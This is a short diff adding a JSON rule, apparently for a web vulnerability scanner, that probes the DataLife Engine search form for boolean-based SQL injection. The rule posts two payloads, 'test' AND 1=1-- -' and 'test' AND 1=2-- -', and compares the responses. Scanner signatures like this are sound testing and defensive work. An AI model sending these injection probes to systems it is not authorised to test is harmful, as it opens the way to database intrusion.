@@ -1,0 +1,13 @@
+﻿{
+ "id": "sqli-dle-search",
+ "engine": "dle",
+ "method": "POST",
+ "path": "/index.php?do=search",
+ "where": "post-form",
+ "body_tpl": "do=search&subaction=search&story={{p}}",
+ "payloads": ["test' AND 1=1-- -", "test' AND 1=2-- -"],
+ "match": {"type": "bool"},
+ "require": "DataLife",
+ "score": 6,
+ "note": "булева инъекция в поиске DLE"
+}
